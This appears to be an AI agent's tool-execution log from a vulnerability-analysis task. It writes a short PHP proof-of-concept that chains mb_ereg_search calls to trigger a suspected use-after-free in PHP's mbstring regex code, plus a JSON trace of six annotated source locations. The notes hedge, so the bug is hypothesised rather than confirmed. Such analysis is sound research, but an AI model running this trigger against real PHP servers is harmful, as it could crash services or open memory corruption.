message:
Command `cd /workspace && cat > poc.php <<'EOF'
<?php
mb_ereg_search_init('abc', 'a');
mb_ereg_search();
mb_ereg_search_regs('a');
mb_ereg_search('a');
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"arg_str","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker initializes the persistent search string used by all following mbregex operations."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1551,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"The attacker also installs a pattern into the global search regex pointer."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search)","line":1433,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs)) { onig_region_free(MBREX(search_regs), 1); } MBREX(search_regs) = onig_region_new();","note":"A search call frees and recreates the shared match region, demonstrating that this API mutates the same global state."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search)","line":1468,"var":"MBREX(search_re)","code":"if (onig_number_of_names(MBREX(search_re)) > 0) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"Named-group enumeration consumes the global regex during normal search execution and is the critical read site."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1575,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs) != NULL) { onig_region_free(MBREX(search_regs), 1); MBREX(search_regs) = NULL; }","note":"The regs API tears down the shared region state before doing another search, increasing the chance that a reused regex object is dereferenced after invalidation."},
{"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search)","line":1438,"var":"MBREX(search_re)","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"The final search invocation uses the global regex pointer and the shared region, which is the memory-safety sink if the state has been invalidated by prior calls."}
]
EOF` executed with exit code 0.

